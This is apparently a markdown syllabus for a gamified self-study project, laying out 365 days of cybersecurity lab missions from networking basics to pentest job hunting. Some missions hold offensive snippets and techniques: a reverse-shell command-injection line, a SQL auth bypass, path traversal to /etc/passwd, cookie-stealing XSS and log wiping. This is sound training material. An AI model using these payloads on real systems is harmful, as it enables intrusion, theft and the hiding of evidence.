# 🛡️ CyberSim: 365 Days of Elite Cybersecurity Missions

This document outlines the exact daily mission schedule for your 10+ LPA journey. 
You can use this file to review the progression, add your own custom missions, or change the difficulty of certain days.

To add a new mission to CyberSim:
1. Create a `level_xx_name` folder in `cybersim/levels/`
2. Update the `DAILY_SCHEDULE` Python dictionary in `gamemaster.py`

---

## 🟢 Phase 1: The Foundations (Days 1–90)
**Goal:** Understand the playground. Networking, Linux, and scripting are the holy trinity.

### Month 1: Networking & Reconnaissance (Days 1-30)
- **Day 1:** 🎯 **The Network Recon (Lab):** Map a live Docker network, find the hidden port 9999 gracefully without triggering alarms.
- **Day 2-5:** 🧠 **Theory Days:** OSI Model deep dive. Memorize Layers 1-4.
- **Day 6:** 🎯 **Nmap Ninja (Lab):** Perform OS fingerprinting and service version detection on a blind target.
- **Day 7:** 🧠 **Theory Day:** TCP 3-Way Handshake & UDP differences.
- **Day 8-10:** 🎯 **Vulnerability Scanning (Lab):** Use Nmap NSE scripts to find known vulnerabilities on an old Apache server.
- **Day 11-15:** 🧠 **Theory Days:** Subnetting math. Be able to calculate CIDR blocks in your head.
- **Day 16-21:** 🎯 **DNS & DHCP Enumeration (Lab):** Extract zone transfers and spoof DHCP requests in an isolated container.
- **Day 22-26:** 🧠 **Theory Days:** Wireshark filtering and PCAP reading.
- **Day 27-30:** 🎯 **PCAP Analysis (Lab):** Analyze a provided PCAP file to find the attacker's IP and the exact payload they sent in a plaintext HTTP POST.

### Month 2: Linux Mastery (Days 31-60)
- **Day 31:** 🎯 **Linux Shell Gym - Hidden Files (Lab):** Find the flag hidden in a `.secret` dotfile.
- **Day 32:** 🎯 **Linux Shell Gym - Permissions (Lab):** Read `/root/flag.txt` by exploiting a misconfigured `sudo` rule.
- **Day 33:** 🎯 **Linux Shell Gym - The Grep Hunt (Lab):** Search a massive 1GB `syslog` for a specific BASE64 encoded string using `grep`.
- **Day 34-40:** 🧠 **Theory Days:** The Linux File Hierarchy (`/etc`, `/var`, `/bin`), user groups, and exactly how `$PATH` works.
- **Day 41-45:** 🎯 **Process Injection Basics (Lab):** Use `strace` and `ltrace` to monitor a running binary and find the hardcoded password it uses.
- **Day 46-50:** 🧠 **Theory Days:** Bash Scripting syntax (loops, variables, conditionals).
- **Day 51-55:** 🎯 **Log Wiping (Lab):** Write a bash script that automatically finds and deletes your IP from `/var/log/auth.log` without destroying the whole file.
- **Day 56-60:** 🎯 **SSH Shenanigans (Lab):** Generate RSA keys, perform local/remote port forwarding (SSH tunneling) to reach a hidden internal web server.

### Month 3: Python for Hackers (Days 61-90)
- **Day 61-65:** 🧠 **Theory Days:** Python data types, lists, dictionaries, error handling.
- **Day 66:** 🎯 **Python Port Scanner - TCP Connect (Project):** Write a script using the `socket` library to scan ports 1-1000.
- **Day 67-70:** 🎯 **Python Port Scanner - Threading (Project):** Make your scanner fast using the `threading` library.
- **Day 71-75:** 🧠 **Theory Days:** HTTP Requests in Python (`requests`, `urllib`).
- **Day 76-80:** 🎯 **Custom Directory Bruteforcer (Project):** Write a tool like `dirb` in Python that takes a wordlist and finds hidden directories on a target.
- **Day 81-85:** 🧠 **Theory Days:** Regular Expressions (Regex) for parsing outputs.
- **Day 86-90:** 🎯 **Log Parser (Project):** Write a Python script that ingests Apache logs and outputs the top 5 IPs that attempted SQL Injection attacks.

---

## 🟡 Phase 2: Advancing the Arsenal (Days 91–210)
**Goal:** Move from understanding the system to exploiting its flaws and securing it.

### Month 4: Defensive Concepts (Days 91-120)
- **Day 91-100:** 🧠 **Theory Days:** CompTIA Security+ Concepts: IAM (Identity and Access Management), MFA bypass theories.
- **Day 101-110:** 🧠 **Theory Days:** Risk Management, Threat Modeling (STRIDE), calculating ALE/SLE.
- **Day 111-120:** 🧠 **Theory Days:** Malware types (Ransomware, Trojans, Rootkits, Logic Bombs) and Social Engineering vectors.

### Month 5: Privilege Escalation (Days 121-150)
- **Day 121:** 🎯 **The SUID Hunt (Lab):** Find a binary with the SUID bit set that allows file reads (`/usr/bin/python3`).
- **Day 122:** 🎯 **Cron Jobs Chaos (Lab):** Exploit a writable `/tmp` script running as a cron job to spawn a root reverse shell.
- **Day 123:** 🎯 **Sudo Without Password (Lab):** Exploit a user allowed to run `/bin/cat` as root to read `/etc/shadow`.
- **Day 124-130:** 🧠 **Theory Days:** How the Linux Kernel handles privileges; the difference between Real UID and Effective UID.
- **Day 131-135:** 🎯 **Path Variable Exploitation (Lab):** Exploit a root script that runs `ls` without an absolute path by hijacking the `$PATH` variable.
- **Day 136-140:** 🎯 **Wildcard Injection (Lab):** Exploit a cron job running `tar *` to execute arbitrary commands.
- **Day 141-150:** 🎯 **Kernel Exploits (Lab):** Compile and execute the *Dirty COW* exploit on an outdated Ubuntu container to get root.

### Month 6: Cryptography & Steganography (Days 151-180)
- **Day 151:** 🎯 **Base64 Decoding (Lab):** Identify and decode a Base64 string.
- **Day 152:** 🎯 **Caesar Cipher (Lab):** Break a classic substitution cipher.
- **Day 153:** 🎯 **Magic Bytes (Lab):** Identify a hidden JPEG using hex signatures (`FF D8 FF E0`), despite its `.txt` extension.
- **Day 154-160:** 🧠 **Theory Days:** Symmetric vs. Asymmetric encryption (AES vs. RSA), Public Key Infrastructure (PKI).
- **Day 161-165:** 🎯 **Hash Cracking (Lab):** Use `JohnTheRipper` and the `rockyou.txt` wordlist to crack a leaked `shadow` file hash.
- **Day 166-170:** 🎯 **Advanced Steganography (Lab):** Extract a hidden ZIP archive embedded inside an audio `.wav` file using frequency analysis tools.
- **Day 171-180:** 🧠 **Theory Days:** Understanding how TLS/SSL handshakes work to secure web traffic.

### Month 7: Web Application Exploitation (Days 181-210)
- **Day 181-185:** 🧠 **Theory Days:** The OWASP Top 10 overview. Understanding the DOM and how browsers render pages.
- **Day 186-190:** 🎯 **Burp Suite Mastery (Lab):** Configure Burp Proxy, intercept a login request, and use Repeater to manually test for SQL auth bypass (`' OR 1=1--`).
- **Day 191:** 🎯 **Web App Exploitation - SQLi (Lab):** Extract the admin password hash from a vulnerable Flask app database.
- **Day 192:** 🎯 **Web App Exploitation - XSS (Lab):** Inject a Stored XSS payload that steals the admin's session cookie.
- **Day 193-200:** 🎯 **Command Injection (Lab):** Abuse a "Ping an IP" feature on a web page to execute reverse shell commands (`127.0.0.1; bash -i >& /dev/tcp/... 0>&1`).
- **Day 201-210:** 🎯 **LFI to RCE (Lab):** Read local files via Local File Inclusion (`../../../../etc/passwd`), then poison an Apache log file to achieve Remote Code Execution.

---

## 🔴 Phase 3: The Real World (Days 211–270)
**Goal:** Test your skills against complex, community-built machines. Integrate multiple vulnerabilities to fully compromise a system.

### Month 8: TryHackMe & Guided Labs (Days 211-240)
- **Day 211-220:** 🎯 **THM Junior Pentester Path:** Complete the introductory web hacking rooms.
- **Day 221-230:** 🎯 **THM Offensive Pentesting Path:** Focus on the Active Directory basics (Kerberbrute, Impacket tools).
- **Day 231-240:** 🎯 **Independent THM Boxes:** Complete 5 "Easy" rated rooms on TryHackMe without using community write-ups.

### Month 9: HackTheBox & Blind Pentesting (Days 241-270)
- **Day 241-250:** 🎯 **HTB Starting Point:** Complete Tier 1 & Tier 2 machines.
- **Day 251-260:** 🎯 **HTB Easy Linux Boxes:** Box 1, 2, and 3. Write a professional pentest report for each, detailing the exact chain from initial foothold to root.
- **Day 261-270:** 🎯 **HTB Easy Windows Boxes:** Introduction to WinRM, Evil-WinRM, and Windows privilege escalation (PrintNightmare, Token Impersonation). 

---

## 💼 Phase 4: Professional Readiness (Days 271–365)
**Goal:** Transmute your skills into a legendary resume. Get certified, get noticed, get hired.

### Month 10: Certification Grind (Days 271-300)
- **Day 271-285:** 🧠 **Exam Selection & Prep:** Choose eJPT, PNPT, or OSCP. Review the respective syllabus and identify your weak points.
- **Day 286-300:** 🎯 **Buffer Overflow Basics (Lab):** (Essential for OSCP) Learn basic memory corruption, finding the offset, overwriting EIP, and executing shellcode on a 32-bit Windows app.

### Month 11: Portfolio & Bug Bounty (Days 301-330)
- **Day 301-310:** 💼 **Brand Building:** Set up a GitHub Pages blog. Upload your THM/HTB write-ups. Make your GitHub profile green with custom Python tools you built in Month 3.
- **Day 311-320:** 🎯 **Bug Bounty - Recon:** Pick a HackerOne VDP. Spend 10 days doing purely passive and active reconnaissance (Sublist3r, Amass, Aquatone) to map their entire attack surface.
- **Day 321-330:** 🎯 **Bug Bounty - Hunting:** Search specifically for low-hanging fruit: Subdomain Takeovers, IDORs, and Information Disclosures on your mapped targets.

### Month 12: Interview Prep & Job Hunting (Days 331-365)
- **Day 331-340:** 💼 **Resume Tailoring:** Build a 1-page resume focusing on skills, your GitHub portfolio, and the CyberSim project over traditional schooling. 
- **Day 341-350:** 🧠 **Mock Interviews:** Prepare for technical questions: "Explain XSS to a 5-year old", "What happens when you type google.com?", "How would you secure an S3 bucket?". Let your Ollama AI Mentor run a mock interview.
- **Day 351-364:** 💼 **The Hustle:** Apply to 10 jobs a day. Junior Penetration Tester, SOC Analyst L1, Application Security Engineer. Reach out to recruiters directly on LinkedIn. 
- **Day 365:** 🎉 **Graduation Day:** You are no longer a Script Kiddie. You are the Elite. Welcome to the industry.
